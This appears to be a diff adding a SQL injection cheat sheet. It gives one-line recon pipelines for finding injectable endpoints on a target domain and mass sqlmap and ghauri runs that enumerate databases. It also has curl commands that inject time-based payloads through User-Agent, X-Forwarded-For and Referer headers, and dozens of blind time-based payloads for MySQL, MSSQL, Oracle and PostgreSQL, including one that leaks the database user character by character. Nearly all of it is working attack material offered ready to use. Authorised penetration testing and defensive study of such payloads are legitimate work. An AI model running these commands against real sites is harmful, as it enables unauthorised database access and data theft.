@@ -1,0 +1,87 @@
+Single domain reconnaissance for potential SQL injectable endpoints : subfinder -d example.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
+
+Multiple subdomain reconnaissance for SQL injection testing : subfinder -d -l subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
+
+Discover potential SQL injectable parameters using gau : echo https://example.com | gau | uro | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '='
+
+Alternative method for finding SQL injectable endpoints using katana : echo https://example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | uro | grep -E '.php|.asp|.aspx|.jspx|.jsp'
+
+Mass SQL injection testing using ghauri  : subfinder -d https://example.com -all -silent | gau --threads 50 | uro | gf sqli >sql.txt; ghauri -m sql.txt --batch --dbs --level 3 --confirm
+
+Comprehensive SQL injection testing using sqlmap : subfinder -d https://example.com -all -silent | gau | urldedupe | gf sqli >sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent
+
+Testing for time-based SQL injection via User-Agent header : curl -s -H 'User-Agent: 'XOR(if(now()=sysdate(),sleep(5),0))XOR' --url 'https://example.com'
+
+Testing for time-based SQL injection via X-Forwarded-For header : curl -s -H 'X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z' --url 'https://example.com'
+
+Testing for time-based SQL injection via Referer header : curl -s -H 'Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'' --url 'https://example.com'
+
+Alternative User-Agent based SQL injection test : curl -v -A 'Mozilla/5.0', (select*from(select(sleep(20)))a) # 'http://example.com'
+
+User-Agent header-based MySQL time-based injection : curl -H 'User-Agent: XOR(if(now()=sysdate(),sleep(5),0))XOR' -X GET 'https://example.com'
+
+X-Forwarded-For header-based MySQL time-based injection : curl -H 'X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z' -X GET 'https://example.com'
+
+Referer header-based MySQL time-based injection : curl -H 'Referer: https://example.com/'+(select*from(select(if(1=1,sleep(20),false)))a)+'' -X GET 'https://example.com'
+
+Oracle database time-based injection payload : SELECT dbms_pipe.receive_message(('a'),10) FROM dual
+
+Microsoft SQL Server time-based injection payload : WAITFOR DELAY '0:0:10'
+
+PostgreSQL time-based injection payload : SELECT pg_sleep(10)
+
+MySQL time-based injection payload : SELECT sleep(10)
+
+MySQL alternative time-based payload with URL encoding : 0'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z
+
+PostgreSQL complex time-based injection payload : 'OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:1') THEN (SELECT '1'||PG_SLEEP(10)) ELSE '0' END)='1
+
+MySQL multi-condition time-based payload with comment bypass : if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR''XOR(if(now()=sysdate(),sleep(10),0))OR'*/
+
+Combined MySQL and MSSQL time-based payload : 1234 AND SLEEP(10)';WAITFOR DELAY '00:00:05';--
+
+Numeric parameter time-based injection payload : paramname=1'-IF(1=1,SLEEP(10),0) AND paramname='1
+
+
+XOR-based payloads using sleep functions for blind SQL injection : 
+
+'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
+
+X'XOR(if(now()=sysdate(),//sleep(10)//,0))XOR'X
+
+X'XOR(if(now()=sysdate(),(sleep(10)),0))XOR'X
+
+0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
+
+0'XOR(if(now()=sysdate(),sleep(10*1),0))XOR'Z
+
+XOR(if(now()=sysdate(),sleep(7),0))XOR%23
+
+Nested Query XOR Payloads:
+
+X'XOR(if((select now()=sysdate()),BENCHMARK(10000000,md5('xyz')),0))XOR'X
+
+'XOR(SELECT(0)FROM(SELECT(SLEEP(10)))a)XOR'Z
+
+(SELECT(0)FROM(SELECT(SLEEP(10)))a)'XOR(if(now()=sysdate(),sleep(10),0))OR'
+
+'%2b(select*from(select(sleep(10)))a)%2b'
+
+1'%2b(select*from(select(sleep(10)))a)%2b'
+
+
+Conditional XOR Payloads:
+
+'OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:10') THEN (SELECT '1'||PG_SLEEP(10)) ELSE '0' END)='1
+
+if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR'
+
+if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR''XOR(if(now()=sysdate(),sleep(10),0) and 1=1)'/
+
+'%20and%20(select%20%20from%20(select(if(substring(user(),1,1)='p',sleep(10),1)))a)--%20
+
+
+
+
+
+
